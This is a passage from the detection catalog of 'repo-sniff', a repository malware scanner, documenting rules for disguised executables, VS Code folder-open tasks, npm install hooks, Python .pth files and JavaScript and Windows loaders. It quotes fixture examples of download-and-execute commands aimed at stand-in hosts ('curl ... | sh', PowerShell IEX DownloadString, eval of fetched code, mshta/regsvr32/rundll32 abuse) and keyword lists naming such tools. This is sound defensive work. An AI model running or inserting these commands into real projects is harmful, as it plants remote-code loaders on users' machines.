# detection catalog

What repo-sniff detects, at which level and why, and what it does not catch
yet. It is written for users who need to read a finding and for contributors
who add rules, and it is kept in sync with the code: every rule that lands
updates its section here.

## contents

1. [threat model](#1-threat-model)
2. [rules at a glance](#2-rules-at-a-glance)
3. [rules](#3-rules): [repository contents](#31-repository-contents),
   [IDE](#32-ide), [dependencies](#33-dependencies),
   [running the program](#34-running-the-program),
   [obfuscation](#35-obfuscation), [deceiving the human](#36-deceiving-the-human)
4. [planned detections](#4-planned-detections)
5. [scanner hardening](#5-scanner-hardening)
6. [exit status and binary files](#6-exit-status-and-binary-files)
7. [how the scanner protects you](#7-how-the-scanner-protects-you)
8. [analysis layers and how rules are built](#8-analysis-layers-and-how-rules-are-built)

## 1. threat model

**Coverage goal:** catch risks at *every* step of the path "download → open
in IDE → install dependencies → build → run tests → run the program", not only
in the program's own code. Each step is a stage, and every rule belongs to one
(the `stage` field of a rule and of a finding):

| Stage | When the code runs | `stage` |
|---|---|---|
| 0 | The repository itself, freshly cloned | `repo` |
| 1 | Opening the folder in an IDE | `ide` |
| 2 | Installing dependencies | `deps` |
| 3 | Building | `build` |
| 4 | Running the tests | `tests` |
| 5 | Running the program (code capabilities) | `run` |
| 6 | Deceiving the human reviewer | `deception` |

Obfuscation is its own `stage` value (`obfuscation`): it hides code at any of
the steps above.

### severity levels

| Level | Meaning |
|---|---|
| CRITICAL | Almost certainly malicious, or a dangerous action runs automatically |
| HIGH | A dangerous capability in a suspicious context |
| MEDIUM | Worth a human look |
| LOW | Ordinary thing, but useful for the overall picture |
| INFO | Context (languages, build system) |

**Combination rule:** severity goes up when signals combine. "Spawns a
process" alone is LOW, while "runs automatically at build time + network +
obfuscation" is CRITICAL. Scoring uses three axes:

- **Trigger:** how automatically the code runs (on IDE open, on install, on
  build, only when the user runs the program).
- **Capability:** how dangerous the action is.
- **Concealment:** obfuscation and tricks that deceive the human reviewer.

The **ATT&CK** entries name the related [MITRE ATT&CK](https://attack.mitre.org/)
technique, where one fits. The same ID is shown in the scan report.

## 2. rules at a glance

All 21 rules that are in the scanner today. The level is the rule's range;
each section below says when each level applies.

| Rule id | Level | Stage | What it catches |
|---|---|---|---|
| [`repo.disguised-executable`](#repodisguised-executable) | CRITICAL | repo | A native executable named like a document, image or other harmless file. |
| [`repo.committed-binary`](#repocommitted-binary) | HIGH, MEDIUM | repo | Committed native executables and libraries, and bytecode a runtime loads. |
| [`repo.windows-dropper`](#repowindows-dropper) | HIGH, CRITICAL | repo | Windows shortcuts, screensavers and HTML applications. |
| [`repo.windows-script`](#repowindows-script) | LOW to HIGH, CRITICAL | repo | Windows command, PowerShell and Script Host files. |
| [`repo.wsh-javascript`](#repowsh-javascript) | MEDIUM | repo | JavaScript that uses Windows Script Host objects. |
| [`repo.symlink-outside`](#reposymlink-outside) | HIGH, MEDIUM | repo | Symbolic links that point outside the repository. |
| [`ide.vscode-folder-open-task`](#idevscode-folder-open-task) | HIGH, CRITICAL, MEDIUM | ide | A VS Code task that runs when the folder is opened. |
| [`deps.npm-lifecycle-hook`](#depsnpm-lifecycle-hook) | INFO to CRITICAL | deps | npm install, pack and publish hooks, followed through the scripts they call. |
| [`deps.python-pth-exec`](#depspython-pth-exec) | INFO to CRITICAL | deps | Python `.pth` lines that run at every interpreter start-up. |
| [`deps.python-start-entrypoint`](#depspython-start-entrypoint) | HIGH, LOW | deps | Python 3.15 `.start` entry points called at start-up. |
| [`run.npm-script-local-server`](#runnpm-script-local-server) | LOW, up to the loader level | run | An npm `start`/`dev`/`build`/`test` script that runs a local file next to a front-end tool. |
| [`run.js-fetch-eval`](#runjs-fetch-eval) | CRITICAL, HIGH, MEDIUM | run | JavaScript that evaluates code it downloaded. |
| [`run.js-function-require`](#runjs-function-require) | CRITICAL | run | Code assembled at run time that is handed `require`. |
| [`run.windows-remote-code`](#runwindows-remote-code) | CRITICAL, HIGH, MEDIUM | run | Windows scripts that download and run code, or abuse system programs to do it. |
| [`run.windows-defender-exclusion`](#runwindows-defender-exclusion) | HIGH | run | Scripts that add Microsoft Defender exclusions or turn protection off. |
| [`obfuscation.encoded-payload-sink`](#obfuscationencoded-payload-sink) | HIGH | obfuscation | Decoded or escaped data that reaches a code or command sink. |
| [`obfuscation.obfuscator-io`](#obfuscationobfuscator-io) | CRITICAL, HIGH, MEDIUM | obfuscation | Output of the obfuscator.io tool. |
| [`obfuscation.minified-source`](#obfuscationminified-source) | HIGH, MEDIUM, INFO | obfuscation | Minified code among ordinary sources. |
| [`obfuscation.windows-encoded-payload`](#obfuscationwindows-encoded-payload) | HIGH, CRITICAL, MEDIUM | obfuscation | PowerShell `-EncodedCommand` and other encoded Windows payloads. |
| [`deception.bidi-control`](#deceptionbidi-control) | LOW to CRITICAL | deception | Trojan Source: bidi controls that change how a line reads. |
| [`deception.nul-byte-in-script`](#deceptionnul-byte-in-script) | HIGH | deception | A NUL byte inside a script. |

## 3. rules

Every rule has the same parts: what it catches, levels and why, examples
(from the fixtures in `crates/repo-sniff-core/tests/fixtures/` or the tests
that generate them), known gaps, and ATT&CK.

### 3.1 repository contents

#### `repo.disguised-executable`

**What it catches.** A native executable (ELF, PE with its `PE\0\0`
signature, Mach-O, fat Mach-O; found by magic bytes) under a name that
promises something else:

- an extension from a closed list of images, documents, media, fonts,
  archives, text, data and configuration formats and source or script files
  (the list is below);
- a double extension that Windows runs on a double click (`.exe`, `.scr`,
  `.com`, `.pif`, `.cpl`) with a document, image, media, archive or text
  extension inside (`invoice.pdf.exe`, also with spaces of any kind before the
  outer extension). Dotted .NET names such as `Newtonsoft.Json.dll` are not
  double extensions;
- bidi and invisible characters in the name.

Names are compared lowercased, with trailing dots and spaces dropped as
Windows does. Extensions honest repositories use for binary test data
(`.bin`, `.dat`, `.o`, `.obj`, `.elf`, `.out`, ...) are not in the list.

<details>
<summary>The closed list of extensions</summary>

`png jpg jpeg gif bmp ico icns svg webp tif tiff psd heic avif pdf doc docx
xls xlsx ppt pptx odt ods odp rtf epub txt md markdown rst csv tsv json jsonc
yaml yml toml xml html htm css ini cfg conf log lock properties env pth start
mp3 mp4 wav avi mov mkv flac ogg webm m4a aac ttf otf woff woff2 eot zip tar gz
tgz bz2 xz 7z rar zst sh bash zsh fish py pyw rb pl pm php js mjs cjs ts tsx
jsx java kt kts scala c h cc cpp cxx hpp cs go rs swift lua r ps1 psm1 bat cmd
vbs`

</details>

**Levels and why.** Always CRITICAL: the name exists to make a person trust
or open the file. The double-extension test is narrow on purpose: a first
benchmark run reported `Newtonsoft.Json.dll` as disguised, so an extension
counts as a lure only when the outer one runs on a double click and the inner
one is a document, image, media, archive or text type
([benchmark](BENCHMARK.md#critical-high-and-medium-findings)).

**Examples.** Generated by `tests/repo_contents.rs`: an ELF named
`positive/disguised/logo.png`, a PE named `invoice.pdf.exe`,
`invoice.pdf          .exe` and `photo<U+202E>gpj.exe`. Not this rule: a PE
named `Newtonsoft.Json.dll` and an ELF named `payload.dat` are
[`repo.committed-binary`](#repocommitted-binary).

**Known gaps.** Homoglyphs, polyglots and appended payloads
([#70](https://github.com/z3nghoul/repo-sniff/issues/70)); more Windows
double-click formats
([#68](https://github.com/z3nghoul/repo-sniff/issues/68)).

**ATT&CK.** T1036 (T1036.008, T1036.007, T1036.002).

#### `repo.committed-binary`

**What it catches.**

- Committed native executables and libraries under any other name, or none:
  `.exe`, `.dll`, `.so`, `.so.N`, `.dylib`, `.node`, ... A file over the size
  limit is judged by its first bytes, or by name if they cannot be read.
- Committed bytecode a runtime loads: Python bytecode (by its header, under
  any name), a Java class (`.class` whose version and constant pool check out;
  any other `CAFEBABE` file counts as a fat Mach-O binary), a Java archive
  (`.jar`, `.war`, `.ear` with a zip header), WebAssembly (`.wasm` with its
  header).

**Levels and why.**

- HIGH for native executables and libraries. Nothing in the scan can tell an
  upstream launcher from a replaced one, and MEDIUM would turn a planted
  binary into exit 0 at the default threshold. Lowering the level needs
  provenance (a hash allow-list or a code signature check), which is a later
  item ([benchmark](BENCHMARK.md#levels-for-vendored-launchers)).
- MEDIUM for bytecode.

**Examples.** Generated by `tests/repo_contents.rs`: an ELF named
`positive/bin/tool`, `app.exe`, `libfoo.so.1.2`, `libbar.dylib` (HIGH);
`Main.class` and `mod.pyc` (MEDIUM). In the benchmark: pip's vendored distlib
launchers (`t32.exe`, `w64.exe`, ...).

**Known gaps.** The code of an executable is not analyzed; it is listed as
such in the report.

**ATT&CK.** None.

#### `repo.windows-dropper`

**What it catches.** Windows "droppers": a `.lnk` with a shortcut header, a
`.scr` that is a PE, any `.hta`. By name alone when the file is too large to
read. A symbolic link is judged by its own name (Windows opens it by that
name) and the head of its target, which is looked up both the Unix and the
Windows way and without case; a `.lnk` or `.scr` link whose target cannot be
read (a chain, a link to a folder) is judged by name.

**Levels and why.**

- HIGH: these formats run on a double click.
- CRITICAL when the name poses as a document or image (`invoice.pdf.hta`,
  bidi or invisible characters).

**Examples.** `positive/dropper/update.hta` (fixture); `invoice.lnk` and
`screensaver.scr`, generated by `tests/repo_contents.rs`.

**Known gaps.** More double-click formats
([#68](https://github.com/z3nghoul/repo-sniff/issues/68)).

**ATT&CK.** T1204.002.

#### `repo.windows-script`

**What it catches.** Windows command, PowerShell and Script Host files by
extension.

**Levels and why.**

- LOW: `.bat`, `.cmd`, `.ps1`, `.psm1`. They are common build glue in honest
  repositories, so they stay in the overall picture without failing anything.
- MEDIUM: Windows Script Host files, `.vbs`, `.wsf`, `.wsh`.
- HIGH: Script Encoder output, `.vbe`, `.jse` (encoding only hides the
  script).
- CRITICAL: any Windows script, and a symbolic link named like one, when its
  name poses as a document or image (`invoice.pdf.bat`, bidi or invisible
  characters).

**Examples.** `positive/scripts/build.bat`, `deploy.ps1` (LOW),
`helper.vbs`, `job.wsf` (MEDIUM), `old.jse` (HIGH). Not reported:
`negative/scripts/notes.bat.txt`, `types.ps1xml`, `build.sh`.

**Known gaps.** The extension is the signal; what the script does is judged
by [`run.windows-remote-code`](#runwindows-remote-code) and the other loader
rules.

**ATT&CK.** T1059.

#### `repo.wsh-javascript`

**What it catches.** JavaScript (`.js` files) that uses Windows Script Host
objects: `WScript` or `WSH` with a member (in any case, as COM resolves it) or
brackets, `ActiveXObject`, `GetObject` or `CreateObject` with the shell, file
system, stream, server HTTP, WMI or task scheduler ProgIDs. Browser `XMLHTTP`
is not matched.

**Levels and why.** MEDIUM: honest Windows tooling uses these objects too
(git-gui creates shortcuts this way), so a human should look.

**Examples.** `positive/wsh/run.js` (`WScript.Echo("hello");`),
`positive/wsh/fso.js`. Not reported: `negative/wsh/xhr.js`,
`negative/wsh/docs.js`.

**Known gaps.** It is a line regex: string concatenation and a line break
after `WScript` evade it until the AST milestone
([#70](https://github.com/z3nghoul/repo-sniff/issues/70)).

**ATT&CK.** T1059.007.

#### `repo.symlink-outside`

**What it catches.** Symlinks pointing outside the repository. The target is
resolved as text twice:

- the Unix way: only `/` separates;
- the Windows way: `/` and `\` separate; a leading separator, a drive letter,
  UNC or device prefix is absolute.

The link is outside when either reading is absolute or climbs above the root.

Remote clones are made with `core.symlinks=false`, so a link arrives as a
plain file holding its target. The links are then read from the clone's own
index (`git ls-files --stage`, run with the same isolation as the clone; the
index is written by the clone, not taken from the remote) and treated as
links, so this rule and the checks that read through links work there too.
Their own files are still scanned as content too, because a system without
symlinks (Git for Windows by default) reads exactly that file, and a link's
blob can be any bytes. Paths from the index are compared with the walk
exactly, never through lossy text.

**Levels and why.**

- HIGH: a link outside the repository can make a tool read or write a file
  the user never meant to expose.
- MEDIUM: a plain path in a system program folder (`/usr/`, `/bin/`, `/opt/`,
  ...; not one with `..`, `//` or `\`, and not `/System/Volumes/`, which leads
  to user data on macOS).
- Not reported: a link to `/dev/null`.

**Examples.** Created by `tests/repo_contents.rs`: `positive/links/abs ->
/etc/hostname`, `up -> ../../../outside.txt`, `win-up`, `drive ->
C:\Windows\System32`, `unc` (HIGH); `python -> /usr/bin/python3` (MEDIUM);
`sneaky -> /usr/../etc/hostname` (HIGH); `negative/links/null -> /dev/null`
(not reported).

**Known gaps.**

- A link that reaches outside through another in-repository link (`d/a ->
  ..`, then `l -> d/a/../x`) is not detected yet
  ([#69](https://github.com/z3nghoul/repo-sniff/issues/69)); targets are not
  yet resolved component by component inside the clone
  ([#90](https://github.com/z3nghoul/repo-sniff/issues/90)).
- A local checkout made without symlink support: its links are plain files,
  scanned as content only.
- On HFS+, a name the index holds in NFC but the disk in NFD is scanned as
  content only ([#84](https://github.com/z3nghoul/repo-sniff/issues/84)).

**ATT&CK.** None.

### 3.2 IDE

#### `ide.vscode-folder-open-task`

**What it catches.** A `.vscode/tasks.json` or `*.code-workspace` with a task
using `"runOn": "folderOpen"`.

- The file is parsed as JSONC, so comments, line breaks and `\u` escapes
  cannot hide the setting. The per-OS `windows`/`linux`/`osx` overrides are
  checked too.
- A file of that name that is a symbolic link to a file in the repository is
  judged by the file it points at, found the way NTFS and APFS find it (either
  separator, any case), as VS Code follows it, and the finding says so.
- A link target too large to read whole lists the link as too large. A target
  the check cannot read (another link, outside the repository, missing), or
  whose text does not name one file for certain (not valid UTF-8, or read as
  different files by Unix and Windows), lists it as unreadable. In both cases
  the scan is inconclusive.
- At most 64 MiB is read through links in one scan; further links that need
  their target are listed as too large.

**Levels and why.**

- HIGH: the task runs as soon as the folder is opened.
- CRITICAL when the task uses the network or a shell.
- A file that cannot be parsed is reported for a manual look ("review it by
  hand") instead of being skipped, because VS Code's own parser is forgiving
  and may still accept it: HIGH if the text mentions both `runOn` and
  `folderOpen`, MEDIUM otherwise (the words may hide behind escapes).

**Examples.** `positive/download-critical/.vscode/tasks.json` (`curl -s
https://payload.invalid/x.sh | sh` on folder open, CRITICAL);
`positive/plain`, `escaped-key`, `split-lines`, `windows-override`,
`workspace/app.code-workspace`; `positive/unparseable`. Not reported: a
commented-out setting (`negative/line-comment`, `block-comment`), the words in
a string (`string-mention`), a `tasks.json` outside `.vscode`
(`negative/elsewhere/docs/tasks.json`).

**Known gaps.** The level is not yet graded by what the task runs
([#43](https://github.com/z3nghoul/repo-sniff/issues/43)); a `.vscode`
directory link can hide `tasks.json`
([#85](https://github.com/z3nghoul/repo-sniff/issues/85)). Other IDE
settings are [planned](#stage-1-opening-in-an-ide).

**ATT&CK.** None.

### 3.3 dependencies

#### `deps.npm-lifecycle-hook`

**What it catches.** An npm install hook in any `package.json` (nested and
`node_modules` ones too): `preinstall`, `install`, `postinstall`,
`prepublish` (deprecated, but npm still runs it), `preprepare`, `prepare`,
`postprepare`, `dependencies`, with their `pre` / `post` variants.

- The `package.json` is read as `JSON.parse` reads it (last duplicate key
  wins, BOM dropped).
- The script is followed through `npm run`, `npm start/test`, `yarn X`,
  `pnpm X`, `bun run`, `npm-run-all`, `run-p`, `run-s`, `concurrently` (also
  `npm:name`), `npx`, `cross-env`, `cd dir && npm install` into another
  `package.json` of the repository, the operators `&&`, `||`, `;`, `|`, `&`,
  `$(...)` and backticks.
- The depth is limited to 10, with a cycle guard and a budget of 2000 steps.
  The level is the highest in the chain, and a chain the limits cut short is
  HIGH, never clean.

**Levels and why.** The level follows what the chain does:

| Level | The chain ... |
|---|---|
| CRITICAL | downloads or sends data, runs `powershell -EncodedCommand`, or runs inline code that uses the network. |
| HIGH | runs inline code, commands from a pipe, or `npx` of a package that is not a dependency. |
| MEDIUM | runs a local file, or starts a front-end dev server. |
| LOW | only runs a front-end build tool, a known honest downloader, an honest `npx` package, or an unknown program. |
| INFO | only runs a known honest tool, or `npm install` in another folder of the repository. |

In detail:

- CRITICAL: `curl`, `wget`, `iwr`, `certutil`, `bitsadmin`, `mshta`, a URL
  passed to any program, `npx <url>`; `powershell -EncodedCommand`; inline
  code (`node -e`, `python -c`) that uses the network.
- HIGH: inline code (`node -e`, `python -c`, `bash -c`, `cmd /c`, `eval`,
  `base64`), commands from a pipe (`| sh`), `npx` of a package that is not a
  dependency of the project.
- MEDIUM: a local file (`node <path>`, `nodemon`, `ts-node`, `tsx`,
  `python <path>`, `bash <path>`, `./script`, `npm start` with a
  `server.js`), or a front-end dev server (`react-scripts start`, `vite`,
  `next dev`, ...), which never exits and runs the project's own config file.
- LOW: a front-end build tool (`vite build`, `webpack`, `next build`: they run
  the project's config file); a known honest tool that downloads binaries
  (`prebuild-install`, `node-pre-gyp`, `playwright`, `puppeteer`, `cypress`);
  a package that honest projects fetch with `npx` or `pnpm dlx` from an
  install hook (`only-allow`, as in vitejs/vite and vuejs/core, with or
  without a version; `npm-force-resolutions`; the list, with the repository of
  each, is `NPX_HONEST`); a program with no entry in the lists.
- INFO: a known honest tool (`husky`, `lefthook`, `patch-package`,
  `node-gyp`, `tsc`, `electron-builder install-app-deps`, `ngcc`, ...; the
  list is `HONEST` in `checks/npm_scripts.rs`), or `npm install` in another
  folder of the repository. Shell built-ins such as `echo` and `exit` are not
  reported. An honest tool does not lower the level of the rest of the line:
  `husky && curl ... | sh` is CRITICAL.

Special cases:

- **Pack and publish hooks** (`prepack`, `postpack`, `prepublishOnly`,
  `publish`, `postpublish`) are not run by a plain `npm install` of the root,
  so they are one level lower than the above. `prepack` runs on `npm pack`,
  `npm publish` and when the repository is installed as a git dependency;
  `postpack` on `npm pack` and `npm publish`; `prepublishOnly`, `publish` and
  `postpublish` only on `npm publish`. The finding says which.
- **A local file with a loader finding.** When the chain of an install, pack
  or publish hook starts a local file that has a loader finding of MEDIUM or
  more (any rule of the [loader signatures](#34-running-the-program) family),
  the hook takes the level of that finding (one level less for a pack or
  publish hook), and the finding names the file and the rule.
- **A command the check could not read completely** is at least HIGH for an
  install hook, and at least MEDIUM for a pack or publish hook and for a
  `start` / `dev` / `build` / `test` script
  ([`run.npm-script-local-server`](#runnpm-script-local-server) then reports
  it too). This covers a quote or `$(...)` that is never closed, a variable, a
  substitution or a brace expansion as the command name or as the file an
  interpreter runs, `$'...'`, `eval`, `source`, `alias`, `function`, `trap`,
  `case`, a heredoc or here-string, a process substitution, input redirected
  into an interpreter (`node < x.js`), `--script-shell`, `npm restart` without
  a restart script, and a chain the limits cut short. The finding says "could
  not fully parse this command; review it by hand" and gives the reason; the
  part that could be read is still reported. A command that is read
  completely is not affected.
- **A `package.json` that `JSON.parse` rejects** (comments, a trailing comma, a
  NUL byte) is LOW: npm refuses it and runs nothing. The finding says what a
  more lenient reader would find. Nested deeper than 64 levels, larger than
  the scan limit, or a symbolic link whose target was not read: HIGH.
- **A hook defined twice** is LOW: npm uses the last one; the earlier
  definition, or the earlier `scripts` object, is ignored by npm but seen by a
  tool that reads the first key.

**Examples.** `positive/levels/package.json`: `preinstall` with `curl ... |
sh` (CRITICAL), `install` with `python -c` (HIGH), `postinstall` with
`node scripts/setup.js` (MEDIUM), `prepare` with `husky` (INFO), `prepack`
with `curl ... | sh` (one level lower). `positive/honest/` holds the honest
forms with their expected levels; `positive/failclosed/` the commands that
cannot be read completely.

**Known gaps.**

- The implicit `node-gyp rebuild` when `binding.gyp` exists and there is no
  `install` script, `<!(...)` command expansions in `binding.gyp`, `.npmrc`
  and `.yarnrc.yml` ([#103](https://github.com/z3nghoul/repo-sniff/issues/103)).
- Workspace selection (`--workspace`, `--filter`); the other manifest is
  reported on its own.
- Shell variables, functions and aliases; some obfuscated forms (caret or
  backslash inside a command name, line continuation, wrappers such as
  `xargs`, `NODE_OPTIONS` assignments) give a lower level than documented
  ([#105](https://github.com/z3nghoul/repo-sniff/issues/105)).
- The names of honest tools are chosen by whoever writes the repository, so a
  program called `husky` that is a file in the repository is still reported
  as a local file.

**ATT&CK.** T1195.001, T1059.007.

#### `deps.python-pth-exec`

**What it catches.** A Python `.pth` file with a line that starts with
`import` and a space or tab, which `site.py` runs at every interpreter
start-up. A line counts if ANY supported version (3.10 to 3.15) would run it:

- lines are split like `str.splitlines` (also on `\r`, `\v`, `\f`,
  `\x1c`-`\x1e`, U+0085, U+2028, U+2029);
- Python's own whitespace set is stripped (3.15 strips each line);
- a BOM counts only at the start of the file;
- the file is read as raw bytes, so a NUL byte or invalid UTF-8 cannot hide
  it.

**Levels and why.**

| Level | When |
|---|---|
| CRITICAL | The executable line looks like a payload (see below). |
| HIGH | Any other executable line; a symlinked or oversized `.pth`. |
| MEDIUM | Not valid UTF-8; an honest form whose module is in the repository. |
| LOW | An honest form whose module is not in the repository; a file Python never reads. |
| INFO | The file only adds paths to `sys.path`. |

- **CRITICAL** when the line uses `exec`, `eval`, `compile`, `__import__`,
  `base64`, `zlib`, `marshal`, `codecs`, `subprocess`, `system`, `popen`,
  `socket`, `urllib`, `requests` and similar words, contains non-ASCII
  characters or `\x`/`\u` escapes, is 200 or more characters long, has a run of
  32 or more hex digits, or has a base64-like run of 40 or more characters
  (letters and digits, entropy of 4.2 bits per character or more, adjacent
  string literals joined first). These thresholds apply only to executable
  `.pth` lines. A line beyond 4096 bytes is not analysed and is CRITICAL by
  itself.
- **Known honest forms:** the file name AND every line match one written by
  setuptools (`distutils-precedence.pth`, `*-nspkg.pth`), virtualenv
  (`_virtualenv.pth`), an editable install (`__editable__.*.pth`) or
  pytest-cov up to 6.2.1 (the list and its sources:
  [honest-pth](../crates/repo-sniff-core/data/honest-pth/README.md)). LOW if
  the module it imports is not in the repository; MEDIUM if it is (honest
  repositories do not commit it, and it is attacker-controlled) or if the scan
  was cut short and presence is unknown.
- **HIGH** for a `.pth` that is a symbolic link (Python follows it; the
  in-repository target is checked too) or is larger than the scan limit
  (Python reads it in full).
- **MEDIUM** for a `.pth` that is not valid UTF-8: honest ones are ASCII, and
  Python may decode it with the system's locale encoding.
- **LOW** for a `.pth` that Python never reads (name starts with a dot, or the
  extension is not exactly lowercase `.pth`) but that has an executable line.

**Examples.** `positive/executes/plain/demo.pth` (`import sys;
print('hello')`, HIGH); `positive/critical/keywords/demo.pth` (`import sys;
exec('pass')` and similar, CRITICAL); the `separator-*` cases split lines on
form feed, U+2028 and the other separators. Not reported: a commented
`import` (`negative/comment-import`). This family keeps its cases in
`python-pth/expectations.tsv`.

**Known gaps.**

- A payload kept under another name and renamed to `*.pth` while the package
  is built (for example hatch `force-include`, setuptools `data_files`) is not
  seen, because the file in the repository does not have that name yet. It
  needs a rule that understands the build configuration
  ([#11](https://github.com/z3nghoul/repo-sniff/issues/11)).
- Legacy locale encodings for non-UTF-8 files are not emulated
  ([#10](https://github.com/z3nghoul/repo-sniff/issues/10),
  [#91](https://github.com/z3nghoul/repo-sniff/issues/91)).

**ATT&CK.** T1546.018.

#### `deps.python-start-entrypoint`

**What it catches.** A Python 3.15 `.start` file (PEP 829) with an entry
point `package.module:callable`, which `site.py` calls at start-up. Only the
strict form `pkgutil.resolve_name` accepts counts.

**Levels and why.**

- HIGH: an entry point is called at every start-up. A `.start` file that is a
  symbolic link (Python follows it; the in-repository target is checked too)
  or is larger than the scan limit (Python reads it in full) is HIGH as well.
- LOW: a `.start` file Python never reads (dot-prefixed name, extension not
  exactly lowercase `.start`) with an entry point.
- Not reported: a `.start` file that is not UTF-8, because Python ignores it.

A matching `.start` never lowers the finding for the `.pth` next to it.

**Examples.** `positive/entry-points/plain/demo.start` (`demo.mod:run`,
HIGH); `positive/inert/DEMO.START` and `.hidden.start` (LOW);
`positive/pairs/with-pth/` (a `.pth` and a `.start` of the same name). Cases
are in `python-start/expectations.tsv`.

**Known gaps.** An unreadable `.start` file is only listed as skipped, not a
finding ([#16](https://github.com/z3nghoul/repo-sniff/issues/16)).

**ATT&CK.** T1546.018.

### 3.4 running the program

The JavaScript and Windows rules of this section and of
[3.5](#35-obfuscation) form the **loader signatures** family: line and file
rules, without an AST. Their full versions come in milestones 7 and 8.

Shared limits of the loader signatures:

- JavaScript is read in `.js`, `.mjs`, `.cjs`, `.jsx`, `.ts`, `.tsx`,
  `.mts`, `.cts`. Windows rules read `.ps1`, `.psm1`, `.bat`, `.cmd`, `.vbs`,
  `.hta`, `.wsf`, the scripts of `package.json` and the commands and arguments
  of the tasks of `.vscode/tasks.json` and `*.code-workspace` (autorun or
  not).
- A JavaScript or Windows script file over 5 MiB is read whole up to 32 MiB; a
  larger one is listed as too large.
- Known gaps until milestones 7 and 8: data followed across files, through
  object fields by name, or through `Array` methods other than callbacks; the
  address of a request built from pieces; JavaScript outside the extensions
  above (inline script in HTML); packers (`eval(function(p,a,c,k,e,d)`);
  obfuscator.io output with renamed identifiers; download and execution on
  different lines of a script, `%VAR:~n,m%` substrings, variables joined into a
  command, string concatenation, the `-f` operator, `[char]` arrays and
  `Set-Alias` in PowerShell, `"power" & "shell"` and `Chr()` in VBScript; the
  same words in other file types (Markdown, `.sh`, `.json` outside scripts and
  tasks) ([#108](https://github.com/z3nghoul/repo-sniff/issues/108),
  [#109](https://github.com/z3nghoul/repo-sniff/issues/109)).

#### `run.npm-script-local-server`

**What it catches.** An npm `start`, `dev`, `build` or `test` script (with
`pre` / `post`) that runs a local JavaScript file (`node <path>`,
`nodemon <path>`, `ts-node`, `tsx`) next to a front-end tool
(`react-scripts`, `vite`, `next`, `webpack`, ...), found through `npm run`,
`concurrently`, `npm-run-all` and the operators.

**Levels and why.**

- LOW: full-stack repositories do this honestly. The finding names the file,
  and says when a build or test script starts a server.
- The level of the file's finding when the file it names has a loader finding
  of MEDIUM or more; the finding names the rule.
- At least MEDIUM for a command the check could not read completely (see
  [`deps.npm-lifecycle-hook`](#depsnpm-lifecycle-hook)).

**Examples.** `positive/run/concurrently/package.json` (`"dev": "concurrently
\"npm:server\" \"react-scripts start\""` with `"server": "node
server/index.js"`); `run/build-starts-server`, `run/npm-run-all`,
`run/test-pipe`. Not reported: a server with no front-end tool
(`negative/server-no-frontend`).

**Known gaps.** The same as the npm hook rule.

**ATT&CK.** T1059.007.

#### `run.js-fetch-eval`

**What it catches.** A dynamic code sink whose code argument comes from a
network call in the same file.

- Sinks: `eval`, `new Function`, `Function()`, `Function.constructor`,
  `vm.runIn*`, `vm.Script`, `vm.compileFunction`, `module._compile`, the
  indirect forms `(0, eval)(x)`, `window.eval`, `globalThis["eval"]`,
  `eval.call`, `x.constructor.constructor(code)`, an alias such as
  `const run = eval`, a name written with `\u` escapes.
- Network calls: `axios`, `fetch`, `http(s).get/request`, `got`, `request`,
  `superagent`, `needle`, `undici`, `XMLHttpRequest`, `$.get`, ...
- Data is followed by variable and by scope through assignments,
  destructuring, compound assignment, parameters of the callbacks given to a
  call that has a network call or a tainted value in its callee chain
  (`.then`, `.catch`, `res.on("data", ...)`), the parameter of a `catch` whose
  `try` block touched one, a function that returns one, and a property path
  (`this.body`).
- The file is lexed first, so a word in a comment or a string is not a call.
  Only the first argument of `eval`, `vm.*` and `_compile` is code (an options
  object is not).

**Levels and why.**

- CRITICAL when the file writes the address of a remote host and is not
  browser-only.
- HIGH when it writes no URL at all (the address may be relative or come from
  elsewhere) or is browser code (it uses `window` or `document` and nothing
  that only Node.js has).
- MEDIUM, "review it by hand", for a call it cannot follow
  (`global["ev" + "al"](x)`, a computed name on `window`, `global`,
  `globalThis`, `self` or `this`) and for a file it cannot read to the end (a
  template literal or comment that never ends, brackets that do not pair up,
  too many tokens), while the file makes network calls. A lexer problem that
  ends at a line break (a JSX apostrophe, a closing tag) is not reported.

These levels come from the benchmark: true flows in honest test pages and
workers were held one level below the rule
([benchmark](BENCHMARK.md#loader-signatures-family-run-of-2026-11-03)).

**Examples.** `positive/fetch-eval/then-eval/lib/remote.js`
(`axios.get(url).then((r) => eval(r.data))` with a remote URL in the file,
CRITICAL); `fetch-eval/browser-page/page.js` and `relative-url/App.js`
(HIGH); `failclosed/computed-callee/call.js` (`global["ev" + "al"](r.data)`,
MEDIUM). Not reported: `negative/comment-and-string/notes.js`,
`negative/template-engine/engine.js`.

**Known gaps.** The shared limits above.

**ATT&CK.** T1105, T1059.007.

#### `run.js-function-require`

**What it catches.** `new Function("require", code)(require)`, also
`new (Function.constructor)("require", code)` and a function made that way
and kept in a variable, then called with `require`.

**Levels and why.** CRITICAL: code assembled at run time gets the module
loader.

**Examples.** `positive/function-require/direct.js` (`new Function("require,
module", "return 2;")(require, module)`), `loader.js`,
`constructor/userController.js`.

**Known gaps.** The shared limits above.

**ATT&CK.** T1059.007, T1620.

#### `run.windows-remote-code`

**What it catches.** Windows scripts that download and run code. Before
matching, logical lines join continuations (`^` in batch, a backtick, an open
bracket or a trailing pipe in PowerShell, ` _` in VBScript, 40 lines at most);
carets, empty `""` pairs and backticks are removed, dashes of any kind become
`-`, text is lowercased, and comment lines are skipped.

- `IEX` / `Invoke-Expression` / `[scriptblock]::Create` / `Invoke-Command`
  with a download on the same logical line (`DownloadString`,
  `DownloadData`, `DownloadFile`, `iwr`, `Invoke-WebRequest`, `irm`,
  `Invoke-RestMethod`, `curl`, `wget`, `Start-BitsTransfer`,
  `Net.WebClient`).
- `certutil -urlcache`; `certutil -verifyctl` with a URL.
- `bitsadmin /transfer` or `/addfile` with a URL.
- `mshta` with a URL, a UNC path or `vbscript:` / `javascript:` / `about:`.
- `regsvr32 /i:` with a URL.
- `rundll32` with `javascript:`, `vbscript:` or `mshtml,RunHTMLApplication`.

**Levels and why.**

- CRITICAL for the forms above.
- HIGH for `bitsadmin /transfer` or `/addfile` without a URL, and for
  `regsvr32` with `scrobj` and no URL.
- MEDIUM when every URL on the `IEX` line is, as a whole, a well-known
  installer (Chocolatey, Scoop, the PowerShell, .NET, Deno, Bun and uv
  installers; Scoop's scheme-less `irm get.scoop.sh | iex` only as the whole
  line): honest build scripts run them exactly this way.

**Examples.** `positive/windows/loader.ps1` (`IEX (New-Object
Net.WebClient).DownloadString('https://payload.example.invalid/x.ps1')`);
`positive/windows/lolbins.cmd` (`mshta`, `regsvr32 /i:`, `rundll32
javascript:`); `positive/windows-honest/` holds honest forms with their
expected levels.

